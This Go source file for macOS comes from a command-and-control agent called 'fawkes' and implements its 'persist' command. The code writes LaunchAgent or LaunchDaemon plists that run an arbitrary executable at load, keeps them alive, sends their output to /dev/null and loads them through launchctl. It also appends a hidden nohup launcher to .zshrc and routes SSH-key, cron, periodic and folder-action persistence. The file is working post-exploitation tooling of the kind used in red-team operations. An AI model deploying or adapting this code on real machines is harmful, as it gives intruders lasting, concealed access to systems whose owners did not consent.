//go:build darwin
// +build darwin

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method   string `json:"method"`
	Action   string `json:"action"`
	Name     string `json:"name"`
	Path     string `json:"path"`
	Hive     string `json:"hive"`
	CLSID    string `json:"clsid"`
	Timeout  string `json:"timeout"`
	Schedule string `json:"schedule"`
	User     string `json:"user"`
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[persistArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "launchagent", "launchdaemon", "launch-agent", "launch-daemon":
		return persistLaunchAgent(args)
	case "shell-profile", "shell", "bashrc":
		return persistShellProfile(args)
	case "ssh-key", "authorized-keys":
		return persistSSHKey(args)
	case "crontab", "cron":
		return persistCrontab(args)
	case "periodic", "periodic-script":
		return persistPeriodic(args)
	case "folder-action", "folder-actions":
		return persistFolderAction(args)
	case "list":
		return persistDarwinList()
	default:
		return errorf("Unknown method: %s. Use: launchagent, shell-profile, ssh-key, crontab, periodic, folder-action, or list", args.Method)
	}
}

// persistLaunchAgent installs or removes a LaunchAgent/LaunchDaemon plist
func persistLaunchAgent(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistLaunchAgentInstall(args)
	case "remove":
		return persistLaunchAgentRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistLaunchAgentInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Name == "" {
		args.Name = "com.fawkes.agent"
	}

	// Determine LaunchAgent vs LaunchDaemon
	isDaemon := strings.ToLower(args.Method) == "launchdaemon" || strings.ToLower(args.Method) == "launch-daemon"
	isRoot := os.Getuid() == 0

	var plistDir string
	var scope string
	if isDaemon && isRoot {
		plistDir = "/Library/LaunchDaemons"
		scope = "system daemon"
	} else {
		home, _ := os.UserHomeDir()
		plistDir = filepath.Join(home, "Library", "LaunchAgents")
		scope = "user agent"
	}

	os.MkdirAll(plistDir, 0755)
	plistPath := filepath.Join(plistDir, args.Name+".plist")

	// Generate plist XML
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
`, args.Name, args.Path)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return errorf("Failed to write plist: %v", err)
	}

	// Load the agent
	loadCmd := exec.Command("launchctl", "load", "-w", plistPath)
	if out, err := loadCmd.CombinedOutput(); err != nil {
		return errorf("Plist created at %s but launchctl load failed: %v\n%s", plistPath, err, string(out))
	}

	return successResult(fmt.Sprintf("LaunchAgent persistence installed:\n  Label: %s\n  Scope: %s\n  Plist: %s\n  Executable: %s\n  Status: loaded + running\n\nRemove with: persist -method launchagent -action remove -name %s", args.Name, scope, plistPath, args.Path, args.Name))
}

func persistLaunchAgentRemove(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "com.fawkes.agent"
	}

	// Try both user and system locations
	home, _ := os.UserHomeDir()
	locations := []string{
		filepath.Join(home, "Library", "LaunchAgents", args.Name+".plist"),
		filepath.Join("/Library/LaunchAgents", args.Name+".plist"),
		filepath.Join("/Library/LaunchDaemons", args.Name+".plist"),
	}

	for _, plistPath := range locations {
		if _, err := os.Stat(plistPath); err == nil {
			// Unload first
			_, _ = exec.Command("launchctl", "unload", "-w", plistPath).CombinedOutput()

			if err := os.Remove(plistPath); err != nil {
				return errorf("Failed to remove %s: %v", plistPath, err)
			}
			return successResult(fmt.Sprintf("Removed LaunchAgent persistence: %s", plistPath))
		}
	}

	return errorf("No plist found for label '%s' in LaunchAgents/LaunchDaemons directories", args.Name)
}

// persistShellProfile — shared implementation (same as Linux)
func persistShellProfile(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistShellProfileInstall(args)
	case "remove":
		return persistShellProfileRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistShellProfileInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (command to execute on login) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	profilePath := filepath.Join(home, ".zshrc") // macOS default shell is zsh

	existing, _ := os.ReadFile(profilePath)
	if strings.Contains(string(existing), marker) {
		return errorf("Shell profile already contains marker '%s'. Remove first.", marker)
	}

	entry := fmt.Sprintf("\n# BEGIN %s\nnohup %s >/dev/null 2>&1 &\n# END %s\n", marker, args.Path, marker)

	f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return errorf("Failed to open %s: %v", profilePath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(entry); err != nil {
		return errorf("Failed to write to %s: %v", profilePath, err)
	}

	return successResult(fmt.Sprintf("Shell profile persistence installed:\n  File: %s\n  Command: %s\n  Marker: %s\n\nRemove with: persist -method shell-profile -action remove -name %s", profilePath, args.Path, marker, marker))
}

func persistShellProfileRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	profiles := []string{
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".zshenv"),
		filepath.Join(home, ".zprofile"),
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".bash_profile"),
		filepath.Join(home, ".profile"),
	}

	removed := 0
	for _, profilePath := range profiles {
		data, err := os.ReadFile(profilePath)
		if err != nil {
			continue
		}

		content := string(data)
		beginTag := fmt.Sprintf("# BEGIN %s", marker)
		endTag := fmt.Sprintf("# END %s", marker)

		if !strings.Contains(content, beginTag) {
			continue
		}

		lines := strings.Split(content, "\n")
		var filtered []string
		inBlock := false
		for _, line := range lines {
			if strings.Contains(line, beginTag) {
				inBlock = true
				continue
			}
			if strings.Contains(line, endTag) {
				inBlock = false
				continue
			}
			if !inBlock {
				filtered = append(filtered, line)
			}
		}

		if err := os.WriteFile(profilePath, []byte(strings.Join(filtered, "\n")), 0644); err != nil {
			continue
		}
		removed++
	}

	if removed == 0 {
		return errorf("No shell profile entries found with marker '%s'", marker)
	}

	return successResult(fmt.Sprintf("Removed persistence from %d shell profile(s) with marker '%s'", removed, marker))
}

